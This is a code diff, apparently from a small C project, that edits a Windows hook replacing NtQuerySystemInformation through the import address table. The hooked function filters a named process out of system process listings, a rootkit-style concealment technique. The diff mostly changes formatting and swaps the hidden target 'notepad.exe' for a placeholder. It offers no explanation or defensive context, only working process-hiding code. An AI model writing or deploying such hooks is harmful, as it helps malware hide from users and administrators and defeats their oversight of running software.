@@ -36,7 +36,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
 	__inout		PVOID SystemInformation,
 	__in		ULONG SystemInformationLength,
 	__out_opt	PULONG ReturnLength
-	)
+)
 {
 	NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
 		SystemInformation,
@@ -53,7 +53,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
 			pCurrent = pNext;
 			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
 
-			if (!wcsncmp(pNext->ImageName.Buffer, L"notepad.exe", pNext->ImageName.Length))
+			if (!wcsncmp(pNext->ImageName.Buffer, L"//", pNext->ImageName.Length)) // Process Name
 			{
 				if (!pNext->NextEntryOffset)
 					pCurrent->NextEntryOffset = 0;
@@ -62,7 +62,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
 					pCurrent->NextEntryOffset += pNext->NextEntryOffset;
 			}
 		} while (pCurrent->NextEntryOffset != 0);
-		
+
 	}
 	return status;
 }
@@ -99,9 +99,9 @@ void StartHook() {
 	}
 
 	DWORD dwOld = NULL;
-	VirtualProtect((LPVOID)&(pFirstThunkTest->u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOld);
+	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOld);
 	pFirstThunkTest->u1.Function = (DWORD)HookedNtQuerySystemInformation;
-	VirtualProtect((LPVOID)&(pFirstThunkTest->u1.Function), sizeof(DWORD), dwOld, NULL);
+	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(DWORD), dwOld, NULL);
 
 	CloseHandle(hModule);
 }
